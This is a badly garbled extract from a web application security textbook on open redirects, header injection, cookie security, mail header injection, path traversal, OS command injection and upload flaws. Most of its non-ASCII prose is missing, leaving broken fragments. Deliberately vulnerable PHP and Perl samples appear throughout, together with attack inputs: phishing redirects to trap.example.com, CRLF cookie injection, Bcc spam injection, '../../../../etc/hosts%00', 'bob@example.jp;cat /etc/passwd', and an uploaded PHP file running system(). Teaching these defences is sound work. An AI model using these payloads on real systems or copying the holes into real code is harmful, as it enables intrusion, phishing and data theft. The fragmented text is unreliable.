 Web  ID 
 Cookie   Cookie  
 
  PHP  " PHP  ID " /dev/urandom 

171

/463/46-015.php
<?php // /dev/urandom  /dev/urandom  function getToken() {
$s = file_get_contents('/dev/urandom', false, NULL, 0, 24); return base64_encode($s); } //   session_start(); $token = getToken(); //  setcookie('token', $token); //  Cookie $_SESSION['token'] = $token;

/463/46-016.php
<?php session_start(); //  //  $token = $_COOKIE['token']; if (! $token || $token != $_SESSION['token']) { die('  '); }
?> <body>  </body>
 PHP PHP  session_regenerate_id   4.8.2 "Cookie  " PHP   4.8 

  hidden 
  

 URL  ID
172

    
 Web   ID  Cookie   ID   
173

4.7
Web  URL URL  URL URL  Google  continue=  URL Gmail40 40
https://www.google.com/accounts/ServiceLogin?continue=https://mail.google.com/mail/

 HTTP  
4.7.1
  Web  URL  Redirector Open Redirect Phishing 
http://example.jp/?continue=http://trap.example.com/  URL  http://trap.example.com/  
  
  " URL"  
174


  
/47/47-001.php
<?php $url = @$_GET['url']; if (! isset($url)) { $url = 'http://example.jp/47/47-003.php'; }
?> <html> <head><title>  </title></head> <body> <form action="47-002.php" method="POST">  <input type="text" name="id"><br>  <input type="password" name="pwd"><br> <input type="hidden" name="url" value="<?php echo htmlspecialchars($url, ENT_COMPAT, 'UTF-8') ?>"> <input type="submit" value="  "> </form> </body> </html>
/47/47-002.php
175

<?php $id = isset($_POST['id']) ? $_POST['id'] : ''; $pwd = isset($_POST['pwd']) ? $_POST['pwd'] : ''; $url = isset($_POST['url']) ? $_POST['url'] : ''; //  if ($id != '' && $pwd != '') { //  URL header('Location: ' . $url); exit();
} //  ?> <body>  <a href="47-001.php">  </a> </body>
/47/47-003.php
<html> <head><title>  </title></head> <body>  </body> </html>
47-001.php47-002.php47-003.php 47002.php  POST  url  URL Location  4-60 
176

 4-60
 47-003.php  URL 
 URL  http://trap.example.com/47/47-900.php 47-900.php 
/47/47-900.php
<html> <head><title>  </title></head> <body>  <form action="47-901.php" method="POST">  <input type="text" name="id"><br>  <input type="password" name="pwd"><br> <input type="submit" value="  "> </form> </body> </html>
 URL
http://example.jp/47/47-001.php?url=http://trap.example.com/47/47-900.php
177

 HTTPS  41  47-002.php  4-61   41 HTTPS
 4-61   47-003.php   
 URL    AND     
 
178

  
 
1.  URL 2.  URL 3.  
 URL  URL    URL "" URL URL         URL   1
if (mb_ereg('example\.jp', $url)) { // 
 URL  example.jp example.jp  URL   URL
179

http://trap.example.com/example.jp.php
 2
if (mb_ereg('^/', $url)) { // 
 URL  /  URL   URL   URL
//trap.example.com/47/47-900.php
 //  URL "" URL FQDN  42  3
if (mb_ereg('^http://example\.jp/', $url)) { // 
 3  URL  http://example.jp   HTTP  HTTP     HTTP  
if (mb_ereg('\Ahttps?://example\.jp/[-_.!~*\'();\/?:@&=+\$,%#a-zA-Z0-9]*\z', // 
 URL  http://example.jp/  URLURI 4.2  \A  \z   https?  http  https 42 HTTP/1.1  RFC2616  Location  URLURI  URL10.30  URL  
180

 URL      
 4-62    ID   7.4  4.7.2HTTP   HTTP HTTP  Cookie  HTTP   HTTP  Cookie  HTTP   
181

   HTTP  HTTP    HTTP  Web  HTTP   Cookie  URL   JavaScript  XSS   HTTP  HTTP   API  HTTP 
  HTTP   Perl  Perl PHP  HTTP   PHP  HTTP 
182

 CGI  url  url  URL  URL " 3"
/47/47-020.cgi

#!/usr/bin/perl

use utf8;

#  Perl  UTF-8

use strict;

# 

use CGI qw/-no_xhtml :standard/;

#  CGI 

my $cgi = new CGI; my $url = $cgi->param('url'); #  url

#  URL  if ($url =~ /^http:\/\/example\.jp\//) {
print "Location: $url\n\n"; exit 0; } ## URL  print <<END_OF_HTML; Content-Type: text/html; charset=UTF-8

<body> Bad URL </body> END_OF_HTML



 4-63 
183

 URL  CGI  Fiddler URL  http://example.jp/47/"4.47-020:CGI  "
http://example.jp/47/47-020.cgi?url=http://example.jp/%0D%0ALocation:+http://trap.example. 
 4-64  URL   Fiddler  HTTP 
 4-65 Fiddler  HTTP  Location  Location 
184

Location: http://trap.example.com/47/47-900.php
CGI  url  %0D%0A CGI  2  Location 
Location: http://example.jp/ Location: http://trap.example.com/47/47-900.php
Apache  CGI  Location Apache   Location   URL 
 HTTP  HTTP   HTTP  HTTP   CrLf  HTTP 
HTTP 
HTTP HTTP Response Splitting Attack HTTP  HTTP  
HTTP/1.1   HTTP  HTTP  1   URL  HTTP  2  
 1  HTTP  HTTP   2  
 HTTP   
HTTP  HTTP   Web 43"1.7 HTTP """
 Cookie
 47-020.cgi  HTTP   URL  CGI http://example.jp/47/"5. 47-020:CGI   Cookie"
185

http://example.jp/47/47-020.cgi?url=http://example.jp/47/47-003.php%0D%0ASetCookie:+SESSID=ABCD123 HTTP  Fiddler 
 4-66 Fiddler  HTTP  
Set-Cookie: SESSID=ABCD123 Location: http://example.jp/47/47-003.php
 HTTP  Set-Cookie  HTTP  4-67 
 4-67 Fiddler  HTTP   Cookie  
Cookie: SESSID=ABCD123
186

 Cookie  4.6  
  HTTP   44 Cookie  CGI  
/47/47-021.cgi
#!/usr/bin/perl use utf8; use strict; use CGI qw/-no_xhtml :standard/; use Encode qw(encode decode);  my $cgi = new CGI; my $pageid = $cgi->param('pageid');  # encode  encode  UTF-8  print encode('UTF-8', <<END_OF_HTML); Content-Type: text/html; charset=UTF-8 Set-Cookie: PAGEID=$pageid  <body>  Cookie  </body> END_OF_HTML
 pageid  PAGEID  Cookie  URL 
http://example.jp/47/47-021.cgi?pageid=P123
 Fiddler 
187

 4-68 Fiddler  HTTP   PAGEID=P123  Cookie   CGI  URL  http://example.jp/47/ "7. 47-021:CGI  Cookie"
http://example.jp/47/47-021.cgi?pageid=P%0D%0A%0D%0A%e2%97%8b%e2%97%8b%e9%8a%80%e8%a1%8c%e 
 4-69 HTTP 
188

 4-70 Fiddler  HTTP 
 Set-Cookie 
 4.3.1  CSS 
  JavaScript  Cookie HTTP  XSS 
43""URL http://www.ipa.go.jp/security/vuln/websecurity.html
44CGI  Location HTTP  302  CGI  200 Apache  
 HTTP   URL  Cookie   HTTP 
HTTP 
URL  Cookie  URL 
189

 %0D%0A  URL  URL 
Cookie  Cookie   Cookie 45  %0D%0A HTTP 
45Netscape  Cookie This string is a sequence of characters excluding semi-colon, comma and white space. If there is a need to place such data in the name or value, some encoding method such as URL style %XX encoding is recommended, though no encoding is defined or required.
  HTTP  46  HTTP  
46 HTTP  
 1 HTTP 
 HTTP  Web  HTTP  Cookie
 URL 
 Web  URL
 HTTP   HTTP 
 2
 API  Cookie 


 API  Cookie 
CGI  print  HTTP   HTTP  Cookie  Bug 
190

Perl  CGI  PHP  Web   HTTP  4-16  HTTP   Cookie  
 4-16 HTTP 

 PHP Perl+CGI.pm Java Servlet ASP.NET

 Cookie setcookie / setrowcookie CGI::Cookie HttpServletResponse#addCookie Response.Cookies.Add

 head redirect HttpServletRes Response.Red

 HTTP  


HTTP  API   API HTTP  API   API  

URL 
 Cookie 
 Cookie  PHP  setcookie  Perl  CGI::Cookie  Cookie  Cookie  
 PHP  header  

191

/47/47-030.php
<?php // 
function redirect($url) { // URL 
if (! mb_ereg("\\A[-_.!~*'();\\/?:@&=+\\$,%#a-zA-Z0-9]+\\z", $url die('Bad URL');
} header('Location: ' . $url); } //  $url = isset($_GET['url']) ? $_GET['url'] : ''; redirect($url); ?>
 redirect  URL   header 
redirect  URL   RFC3986  IPv6  IP   [  ]  
PHP  header 
 PHP 474.4.2  5.1.2  header  ""
PHP   LF0x0A CR0x0D PHP 5.3.5  CR  HTTP 
 Internet ExplorerGoogle ChromeOpera  3   CR  HTTP  Firefox  Apple Safari 
 PHP  header  
47http://us2.php.net/manual/zh/function.header.php
4.7.3  HTTP 
192

  API    URL 
193

4.8Cookie 
Web  Cookie  Cookie   Cookie 
Cookie  Cookie   Cookie  Cookie  ID  Cookie   Cookie  HTTP  Cookie  HTTP  4.7.2   Cookie  4.8.2 

4.8.1Cookie  Web  PHP  Servlet   ID  Cookie Web  Cookie  
 Cookie 
 Cookie   Cookie   Cookie 
  Cookie  5.3 
 Cookie 
 Cookie   4-17  Cookie  
 4-17Cookie 

Cookie
194




 

 

 Cookie   
 
 
 
 


 API     

Cookie   

 XSS  HTTP   

 

    

 
  Cookie    


 Cookie   
 Web  Session Timeout  Cookie  

195

 Cookie "" 4-71  Google  "" Cookie 
 4-71Google  "" 5.1.4  Cookie  "" Cookie   Padding Oracle  MS10-070  Web   hidden  Cookie  ASP.NET ViewState hidden Form Authentication Ticket Cookie  RFC2040   2010  9  17  Ekoparty T.Duong  J.Rizzo   Padding Oracle 48  10   MS10-070 
196

2010  9  29     7.1 
 Ekoparty  http://netifera.com/reserch/poet/PaddingOraclesEverywhereEkoparty2010.pdf  MS10-070"ASP.NET 2418042" http://technet.microsoft.com/en-us/security/bulletin/MS10-070
48Padding Oracle  Oracle  4.8.2Cookie    3 Cookie  Secure   Cookie  HTTPS  Cookie  HTTPS Cookie   Cookie  ID    Cookie  Cookie   HTTP  HTTPS  ID  Cookie   ID Cookie HTTPS  "" Cookie 
197


 Cookie   HTTPS  CookiePXPSESIDhttps://www.hashc.co.jp/wasbook/set_non_secure_cookie.php
     se t_non_se cure _cookie .php

<?php ini_set('session.cookie_secure', '0'); //  ini_set('session.cookie_path', '/wasbook/'); //  ini_set('session.name', 'PXPSESID'); //  ID 

session_start();

// 

$sid = session_id(); //  ID

?>

<html>

<body>

 <br>

PXPSESID =

<?php echo htmlspecialchars($sid, ENT_NOQUOTES, 'UTF-8'); ?>

</body>

</html>

 Cookie   ID 

198

 Cookie 1.  Fiddler 2.  CookiePXPSESID 3.  4.  Fiddler  Cookie 
 http://example.jp/48/ "/48/ " "1.HTTPS  Cookie" Cookie  4-72  
 4-72 Cookie   Cookie  /48/ "2.48-900: " URL http://trap.example.com/48/48-900.html   0 http://www.hash-c.co.jp:443/wasbook/ HTML 
<body>  <img src="http://www.hash-c.co.jp:443/wasbook/" width="0" height="0"> </body>
URL  443  HTTPS  http:  URL   Cookie Fiddler  OK  49 49 Wireshark Host :443  Fiddler  Bug
199

 4-73Fiddler  OK   HTTP 
 4-74 Cookie  443  HTTP  HTTPS  Cookie 
200

 4-75 Cookie   Cookie 
   Web   Web  443   Fiddler  443  
201

 4-76 HTTP   HTTP  Fiddler  Wireshark  Chris Sanders Wireshark [1]  Cookie  Cookie   Cookie 
     Cookie   Web  HTTP  HTTPS  HTTP   HTTPS 4-77  HTTP  HTTPS  
 4-77 HTTP  HTTPS  Web  HTTP  HTTPS  ID  Cookie  HTTP  Cookie  ID HTTP   HTTPS  Cookie  
202



 Cookie  Cookie  
 ID  Cookie 
 PHP  ID  Cookie  php.ini 
session.cookie_secure = On
Apache Tomcat  HTTPS  ID  Cookie  
 ASP.NET  web.config 
<configuration> <system.web> <httpcookies requireSSL="true" /> </system.web>
</configuration

 ID  Cookie   4.6.4  Cookie  HTTP  HTTPS  ID HTTPS 
 Cookie  /463/46-015.php   HttpOnly 
/48/48-001.php
<?php // /dev/urandom  /dev/urandom  function getToken() {
$s = file_get_contents('/dev/urandom', false, NULL, 0, 24); return base64_encode($s); } //   session_start(); session_regenerate_id(true); //  ID $token = getToken(); // 
203

//  Cookie setcookie('token', $token, 0, '', '', true, true); $_SESSION['token'] = $token;  HTTPS  /463/46-016.php  /48/48-002.php <?php session_start(); //  //  $token = $_COOKIE['token']; if (! $token || $token != $_SESSION['token']) {
die(''); } ?> <body>  </body>
 URL 
https://example.jp/48/48-001.php
 /48/ "3.48-001: SSL"
 4-78 
204

""  7.2.3 
 4-79  HTTP SSL /48/ "4.48-001:   SSL"48-001.php ""48-002.php  
 4-80 SSL  48-001.php  Cookie   SSL  48-002.php    ID  HTTPS 
  HTTPS    HTTPS   HTTPS  
205

 Cookie  3  Cookie  ID  Cookie 
Domain 
Domain  Cookie  Domain  ID  
 PHP  ID  Domain   Domain 
Path 
PHP  ID  path=/   ID Path 
 Path  JavaScript   3.2 
Expires 
 ID  Cookie  Expires  Cookie   Expires  5.1.4 
HttpOnly 
 HttpOnly  Cookie  JavaScript  JavaScript  ID  Cookie  HttpOnly  4.3  HttpOnly  
PHP  ID  Cookie  HttpOnly  php.ini
session.cookie_httponly = On
  Cookie  Cookie   ID HTTP  Cookie 

[1] Chris Sanders. 2013.Wireshark .
206

 207

4.9
Web    4.9.1 
  hidden        4.9.2   hidden    hidden  4-81
 4-81 hidden   hidden   hidden    Mail Transfer AgentMTA 
208

 
 4-82  4-82 A X X  R  R  A  A   X  MTA   4.9.2  ToSubject       
209

 
  
     /49/49-001.html
<body>  <br> <form action="49-002.php" method="POST">  :<input type="text" name="from"><br>  :<textarea name="body"> </textarea> <input type="submit" value="  "> </form> </body>
 /49/49-002.php
<?php $from = $_POST['from']; $body = $_POST['body']; mb_language('Japanese'); mb_send_mail("wasbook@example.jp", "  ",
210

" \n\n" . $body, "From: " . $from); ?> <body>  </body>
mb_send_mail   4 From  4  50  50http://php.net/manual/zh/function.mb-send-mail.php
additional_headers  "\n"   "alice@example.jp" " 4309 " 
 4-83
211

 4-84  wasbook  
 1  49900.html 49-001.html   textarea  form  action  URL  
/49/49-900.html 49-001.html   <form action="http://example.jp/49/49-002.php" method="POST">  :<textarea name="from" rows="4" cols="30"> </textarea><br> 

212

 4-85  bob Becky  
 4-86wasbook bob  wasbook bob  Bcc  bob   Bcc49-002.php  Cc  ToReply-To   Subject Subject 
213

 2 "......"   From   49-900.html   MIME 
trap@trap.example.com Bcc: bob@example.jp  Super discount PCs 80% OFF! http://trap.example.com/
Foxmail
 4-87  From    MIME     49-002.php 
214

 51 

 4-88
 MIME  multipart/mixed   49-901.html  http://example.jp/49 "5. 49-901:  "
 
51 7.4.4 
  HTTP  4-89 

 52

To: wasbook@example.jp Subject: =?ISO-2022-JP?B?GyRCTGQkJDlnJG8kOyQsJCIbKEI=?= =?ISO-2022-JP?B?GyRCJGokXiQ3JD8bKEI=?= From: alice@example.jp Content-Type: text/plain; charset=ISO-2022-JP

215

 

  4309 

 4-89
52Subject  2 "" 2   HTTP  
To Subject From  sendmail  53
53sendmail  -t   ToCcBcc 
 HTTP    From  Bcc 

 4-90 Bcc  
 4-91  
216

 CGI  sendmail  
  sendmail  
 
      3 
 sendmail    sendmail  OS  4.11    54      49-002.php  From   From      
217


 mb_send_mail   55 

  

 RFC532256  RFC   Web  RFC   

Subject  4.2  ""   160 UTF-8 UTF-8  mb_ereg 
if (preg_match('/\A[[:^cntrl:]]{1,60}\z/u', $subject) == 0) { die('  1-60  ');
}
54 "Security of WebAppli&Mail"[2]
55 
56http://tools.ietf.org/html/rfc5322
 
   sendmail 
218

 Web    SMTP  3  HTTP& [3]   HTTP   SMTP  SMTP  SMTP  NTT Communications  .NET Framework  SMTP Command Injection[1]  .NET Framework  
 [1] NTT Communications.2011  1  11 . .NET Framework  SMTP Command Injection  .NET Framework  SMTP Command Injection. 2011  1  21  .  /http://www.ntt.com/icto/security/images/sr20110110.pdf [2]  .2007  3  27 . Security of WebAppli&Mail. 2010  12  11  . http://rocketeer.dip.jp/secProg/MailSecurity001.pdf [3]  .2010.3  HTTP 3  HTTP& .  .
219

4.10
Web     Web   Web 
 Web   OS OS   4.10.1  OS   OS  4.11    4.10.2 
4.10.1
 Web    
 Web  
 Web     
   
220


   template= 
/4a/4a-001.php
<?php define('TMPLDIR', '/var/www/4a/tmpl/'); $tmpl = $_GET['template'];
?> <body> <?php readfile(TMPLDIR . $tmpl . '.html'); ?>  </body>
 TMPLDIR  template   $tmpl  readfile   
     /4a/tmpl/spr ing.html
<br>
221

 URL 
http://example.jp/4a/4a-001.php?template=spring
 4-92  
/var/www/4a/tmpl/spring.html
 URL 
http://example.jp/4a/4a-001.php?template=../../../../etc/hosts%00
 4-93 Linux   Linux  /etc/hosts   [NUL]   0 57
222

57 1. 4.2  C  
/var/www/4a/tmpl/../../../../etc/hosts[NUL].html
 ../   
/etc/hosts
 etc/hosts   Web      PHP  Web  OS   4.11 
  Web  /etc/hosts     open "/4a/ ""3. 4a001: "  PHP  HTML  PHP 
  3 
   "
223

"  3  
 
      
      ../   /\:  PHP  basename  basename  Windows   basename('../../../../etc/hosts')  hosts  basename  /4a/4a-001b.php
<?php define('TMPLDIR', '/var/www/4a/tmpl/'); $tmpl = basename($_GET['template']);
224

?> <body> <?php readfile(TMPLDIR . $tmpl . '.html'); ?>  </body>
basename 
PHP  basename 58 basename   txt
$file = basename($path) . '.txt';
 a.php%00 
 4-94
 Windows  Unix  C  \0  a.php txt 
 

 
 4a-001.php 
/4a/4a-001c.php
<?php define('TMPLDIR', '/var/www/4a/tmpl/'); $tmpl = $_GET['template']; if (! preg_match('/\A[a-z0-9]+\z/ui', $tmpl)) { die('remplate  '); }
?> <body>
225

<?php readfile(TMPLDIR . $tmpl . '.html'); ?>  </body>
 preg_match  $tmpl  ereg   4.2  58 PHP5.3.5    4.10.2  Web  URL     
 226

 URL 
http://example.jp/4a/data/

 4-95  URL  Directory Listing  user.txt 
227

 4-96  user.txt   2004  Web  
  
  URL   URL    user.datdata.txt    Apache  httpd.conf  .htaccess    
 
228

  
Apache  httpd.conf 
<Directory  > Options -Indexes  
</Directory>
 httpd.conf .htaccess   .htaccess  
Options -Indexes
Apache    Web   Apache  .htaccess  txt  Apache 
     .htacce ss
<Files "*.txt"> deny from all
</Files>
229

4.11 OS 
Web  Shell  OS Shell  OS  Shell  OS  OS  OS   4.11.1OS   Web  Shell  OS   Shell  OS  OS  Shell  Windows  cmd.exe  Unix  shbash OS  Shell   Web  OS  
1.  2.  3.  OS Local Exploit 4.  Web   Web 
 Web     OS  OS 
230

  OS 
 sendmail   4-97  OS  
 4-97  HTML 
     /4b/4b-001.html
<body> <form action="4b-002.php" method="POST">  <br>  <input type="text" name="mail"><br>  <textarea name="inqu" cols="20" rows="3"> </textarea><br> <input type="submit" value="  "> </form> </body>
231

 system  sendmail   59 template.txt 
/4b/4b-002.php
<?php $mail = $_POST['mail']; system("/usr/sbin/sendmail -i <template.txt $mail");
//  ?> <body>  </body>
 template.txt  Subject  MIME 
     /4b/te mplate .txt From: webmaster@example.jp
Subject: =?UTF-8?B?5M+X44GR5LuM44GR44G+44GX44Gf?= Content-Type: text/plain; charset="UTF-8" Content-Transfer-Encoding: 8bit  

232

 4-98 OS   OS  
bob@example.jp;cat /etc/passwd
 4-99  /etc/passwd 
 4-99  OS   Web    OS  OS   Web 
  OS  Unix  find find  exec find  OS  OS  59 sendmail -i    OS System Call Shell  Shell  OS  Windows  cmd.exeUnix  OS  sh bashcsh  Shell Pipe 
233

 4-100 Shell  OS  Shell  OS Shell    OS   OS  Shell  Perl  open   OS 
 Shell  OS  Shell   Shell    Shell  Shell  1  OS  Shell  Unix  Shell    Shell 
234

Windows  cmd.exe  &  Unix  ; | &&  ||  Unix  60
Shell  ;|  Shell   Shell   Shell 
 OS  Shell  OS  OS 
 Shell 
Perl  open  open   Shell  OS  open  Linux  pwd  CGI  open   | 
/4b/4b-003.cgi
#!/usr/bin/perl print "Content-Type: text/plain\n\n<body>"; open FL, '/bin/pwd|' or die $!; print <FL>; close FL; print "</body>";
 pwd 
 Perl  open   |  OS 
235

 CGI  
/4b/4b-004.cgi

#!/usr/bin/perl

use strict;

use utf8;

use open ':utf8'; #  UTF-8

use CGI;



print "Content-Type: text/plain; charset=UTF-8\r\n\r\n";



my $q = new CGI;

my $file = $q->param('file');

open (IN, $file) or die $!; # 

print <IN>;

# 

close IN;

# 

 file /sbin  61

file=ls+/sbin|



 4-101 /sbin 

Web  Shell  Shell  OS  OS 
236

OS   Shell system open   Shell   Shell 
60http://technet.microsoft.com/zhcn/library/cc737438(v=ws.10).aspx 61 4.10 
  OS  
 OS   Shell    OS      
  OS    Shell   Shell     OS 
237

 OS  Shell   OS  OS  
 PHP /4b/4b-002.phpPHP   mb_send_mail 
/4b/4b-002a.php
<?php $mail = $_POST['mail']; mb_language('Japanese'); mb_send_mail($mail, "  ", "  ", "From: webmaster@example.jp");
?> <body>  </body>
 4.9  
 Shell 
 OS  OS  Shell  PHP  62 Perl   PHP 
Perl  system  OS Perl  system    Perl  grep 
 Shell  OS 
my $rtn = system("/bin/grep $keyword /var/data/*.txt");
 Shell 
my $rtn = system('/bin/grep', '--', $keyword, glob('/var/data/*.txt'));
 Shell Shell  ; | `  OS  
system  2  '--'Option
238

Parameter -R   - 
system  4  glob *.txt  PHP  glob  Shell Shell   Shell 
 Perl  open  Shell
 sysopen  open 
 open  2 
open(FL, '<', $file) or die '  'txt'));

 2   4-18open 

 `<> `>` `>>` `|-` `-|`

     

 |-  Perl5.8   Shell OS 
/4b/4b-002b.cgi

#!/usr/bin/perl use strict; use CGI; use utf8; use Encode;  my $q = new CGI; my $mail = $q->param('mail');  #  Shell  sendmail 
239

open (my $pipe, '|-', '/usr/sbin/sendmail', $mail) or die $!;  #  print $pipe encode('UTF-8', <<EndOfMail); To: $mail From: webmaster\@example.jp Subject: =?UTF-8?B?5M+X44GR5LuM44GR44G+44GX44Gf?= Content-Type: text/plain; charset="UTF-8" Content-Transfer-Encoding: 8bit   EndOfMail  close $pipe;  #  print encode('UTF-8', <<EndOfHTML); Content-Type: text/html; charset=UTF-8  <body>  </body> EndOfHTML
 system   /usr/sbin/sendmail $mail   Shell OS 

 Shell  OS  Shell   OS 
sendmail  -t   ToCcBcc   OS  

/4b/4b-002c.php
<?php $mail = $_POST['mail']; $h = popen('/usr/sbin/sendmail -t -i', 'w'); if ($h === FALSE) { die('  ..');
240

} fwrite($h, <<<EndOfMail To: $mail From: webmaster@example.jp Subject: =?UTF-8?B?5M+X44GR5LuM44GR44G+44GX44Gf?= Content-Type: text/plain; charset="UTF-8" Content-Transfer-Encoding: 8bit   EndOfMail ); pclose($h); ?> <body>  </body>
 sendmail  -t  To   PHP  popen  fwrite  sendmail 
 OS   4.9 
 OS 
3 OS  Shell  OS   OS  Shell  PHP   escapeshellarg 
 escapeshellarg  4b-002.php  system  
/4b/4b-002d.php
system('/usr/sbin/sendmail <template.txt ' . escapeshellarg($mail));
PHP  escapeshellarg  escapeshellcmd   [2]
 Shell  escapeshellarg  
OS 
 OS 
241



  Web  OS  
 4.2   OS  Shell  OS    OS  OS    OS  Web   Web  
  Web  OS  Local ExploitOS   Web   root  
  7.1  62 pcntl_exec  CGI  PHP  http://php.net/manual/zh/pcntl.installation.php
 Shell   Shell   Shell  PHP
242

`system()` `exec()` `passthru()` `proc_open()` `popen()`

Pe rl

`exec()` `system()` \`...\` `qx/.../` `open()`

Ruby

`exec()`

`system()`

\`...\`

Ruby  Perl  Shell File.open()  open()  Shell 

[1]  .2008. Web  Tips Web  .  ·  ·  .
[2]  .2011  1  1 . PHP  escapeshellcmd PHP  escapeshellcmd . 2011  1  1  : http://www.tokumaru.org/d/20110101.html#p01

243

4.12
 Web  PDF   4.12.1 
 DoS       DoS   Web  DoS Denial of Service Attack
 4-102 DoS  DoS   DoS PHP  php.ini   4-19   file_uploads  Off   PHP http://php.net/manual/zh/ini.core.php  4-19php.ini 
244





file_uploads

 

upload_max_filesize

 

max_file_uploads

 

post_max_size

POST  

memory_limit

 

 On 2MB 20 8MB 128MB

 Apache  httpd.conf   PHP  DoS  100K  63

LimitRequestBody 102400
 PHP  Apache 
 CPU 
 DoS    
 
 CPU  CPU CPU  

 Web   Web 

245

 4-103  4.11  OS   4.12.2    3   PC  JavaScript 
 4-104  JavaScript   HTML  4.12.3   PC   
246

  7.4      URL   5.3  63http://httpd.apache.org/docs/2.2/en/mod/core.html#limitrequestbody 4.12.2   Web   phpaspaspxjsp    OS   Web        
247




 PHP   form  enctype  "multipart/form-data" 
/4c/4c-001.php
<body> <form action="4c-002.php" method="POST" enctype="multipart/form-data">  <input type="file" name="imgfile" size="20"><br> <input type="submit" value="  "> </form> </body>
 /4c/img/ 
/4c/4c-002.php
<?php $tmpfile = $_FILES["imgfile"]["tmp_name"]; //  $tofile = $_FILES["imgfile"]["name"]; //   if (! is_uploaded_file($tmpfile)) { // 
die('  '); //  img 
248

} else if (! move_uploaded_file($tmpfile, 'img/' . $tofile)) { die('  ');
} $imgurl = 'img/' . urlencode($tofile); ?> <body> <a href="<?php echo htmlspecialchars($imgurl); ?>"><?php echo htmlspecialchars  <br> <img src="<?php echo htmlspecialchars($imgurl); ?>"> </body>

 4-105  XSS 4c-002.php  URL  urlencode   HTML Unix   <>"   XSS 
PHP   PHP 
4c-900.php
<pre> &lt;?php
system('/bin/cat /etc/passwd'); ?> </pre>
 PHP  system  cat  etc/passwd 
249

 PHP  4c-900.php  
 4-106 PHP   4c-900.php  PHP  4107  etc/passwd  PHP  
 4-107 PHP   OS  system  passthru  OS       .php  .asp  
250



   
 ""
 4c-002.php 
/4c/4c-002a.php
<?php function get_upload_file_name($tofile) { /*  */ }
$tmpfile = $_FILES["imgfile"]["tmp_name"]; $orgfile = $_FILES["imgfile"]["name"]; if (! is_uploaded_file($tmpfile)) {
die('  '); } $tofile = get_upload_file_name($orgfile); if (! move_uploaded_file($tmpfile, $tofile)) {
die('  '); } $imgurl = '4c-003.php?file=' . basename($tofile); ?> <body> <a href="<?php echo htmlspecialchars($imgurl); ?>"><?php echo htmlspecialchars($orgfile  <br> <img src="<?php echo htmlspecialchars($imgurl); ?>"> </body>
 2  /4c/img get_upload_file_name  URL  get_upload_file_name 
/4c/4c-002a.phpget_upload_file_name 
define('UPLOADPATH', '/var/upload');
function get_upload_file_name($tofile) { // 
251

$info = pathinfo($tofile); $ext = strtolower($info['extension']); //  if ($ext != 'gif' && $ext != 'jpg' && $ext != ../Images/7-') {
die('  gifjpg ../Images/7-  '); } //  $count = 0; //  do {
//  $file = sprintf('%s/%08x.%s', UPLOADPATH, mt_rand(), $ext); //  $fp = @fopen($file, 'x'); } while ($fp === FALSE && ++$count < 10); if ($fp === FALSE) { die('  '); } fclose($fp); return $file; }

get_upload_file_name  gifjpg ../Images/7-
 64  'x'  fopen   fopen   10 
64 PHP  http://www.php.net/manual/zh/function.tempnam.php#98232 
 move_uploaded_file  
 4c-003.php 
/4c/4c-003.php

<?php //   // define('UPLOADPATH', '/var/upload'); $mimes = array('gif' => 'image/gif', 'jpg' => 'image/jpeg', ../Images/7-' => 'image../Images/7-',);

$file = $_GET['file'];

$info = pathinfo($file);

// 

$ext = strtolower($info['extension']);

// 

$content_type = $mimes[$ext]; //  Content-Type

252

if (! $content_type) { die('  gifjpg ../Images/7-  ');
} header('Content-Type: ' . $content_type); readfile(UPLOADPATH . '/' . basename($file)); ?>
 file  gifjpg ../Images/7-  Content-Type readfile  basename   4.10 
  Internet ExplorerIE 

  
 SSIServer Side Include HTML  IncludeCommand SSI  HTML   shtml html  SSI   html 
  
4.12.3

  PNG  HTML   HTML  JavaScript XSS
 HTML  JavaScript  PDF   HTML  HTML HTMLXSS  
 XSS  4.3.1 
253

 XSS   Content-Type   Content-Disposition:attachment
 XSS 
  XSS  Internet ExplorerIE IE  IE    IE 
 XSS  HTML  JavaScript  XSS    IE8  XSS  IE7    http://example.jp/4c/4c-001a.php http://example.jp/4c/  "2. 4c-001a: " 
254

 4c901../Images/7- 
     4c-901../Image s/7-
<script>alert('XSS');</script>
 4c-901../Images/7-  
 4-108  4c-901../Images/7-  IE7  JavaScript  IE8 
 4-109 IE7  XSS   JavaScript   URL  img  JavaScript   iframe  HTML   JavaScript  HTTP  Fiddler 
255

 4-110 JavaScript  HTTP 
 HTTP  Content-Type  image../Images/7- IE7  HTML   JavaScript 
 XSS  4.3  XSS  Cookie  Web 
PDF  XSS
 PDF  

4c-011.php  4c-001.php action  4c-012.php
4c-012.php4c-013.php  PDF
/4c/4c-012.php

<?php define('UPLOADPATH', '/var/upload');  function get_upload_file_name($tofile) {
//  $info = pathinfo($tofile); $ext = strtolower($info['extension']); if ($ext != 'pdf') {

// 

256

die('  pdf  '); } // ...  $imgurl = '4c-013.php?file=' . basename($tofile); ?> <body> <a href="<?php echo htmlspecialchars($imgurl); ?>"><?php echo htmlspecialchars  </a><br> </body>

 4c-003.php  /4c/4c-013.php

<?php define('UPLOADPATH', '/var/upload'); $mimes = array('pdf' => 'application/x-pdf');

$file = $_GET['file'];

$info = pathinfo($file);

// 

$ext = strtolower($info['extension']);

// 

$content_type = $mimes[$ext]; //  Content-Type

if (! $content_type) {

die('  pdf  ');

}

header('Content-Type: ' . $content_type);

readfile(UPLOADPATH . '/' . basename($file));

?>

 4c-011.php  PDF  

 4-111 PDF   PDF 
257

 4-112 PDF  HTML  PDF  XSS  PDF  script  HTML   4c-902.pdf 4c-011.php
4c-902.pdf
<script>alert('XSS');</script>
 PDF "4c-902.pdf "  " "
 4-113"" 258

URL  URL file=  
http://example.jp/4c/4c-013.php?file=1af12536.pdf
 /a.html  URL   PATHINFO URL  a.html   4c-013.php 
http://example.jp/4c/4c-013.php/a.html?file=1af12536.pdf JavaScript  IE7  IE8  JavaScript 
 4-114XSS   HTMLJavaScript PDF   URL  PATHINFO JavaScript  Content-Type   PDF  XSS  Content-Type PDF   Content-Type  application/pdf Content-Type  application/x-pdf`   XSS  Internet Explorer Internet Explorer  HTTP  Content-Type  URL     IE  Content-Type
259

 GIFJPEG65PNG 
 4-20

 GIF JPEG PNG

 GIF87a  GIF89a \xFF\xD8\xFF \x89PNG\x0D\x0A\x1A\x0A

Internet Explorer7 
Content-Type 
 Content-Type 
Content-Type 
Content-Type   HTML  HTML  66" XSS" PNG    Content-Type   67

 IE   Content-TypeIE 
IE Content-Type Content-Type  HKEY_CLASSES_ROOT\MIME\Database\Content Type IE Content-Type 4-115 PDF  Content-Type  application/pdf application/x-pdf

260

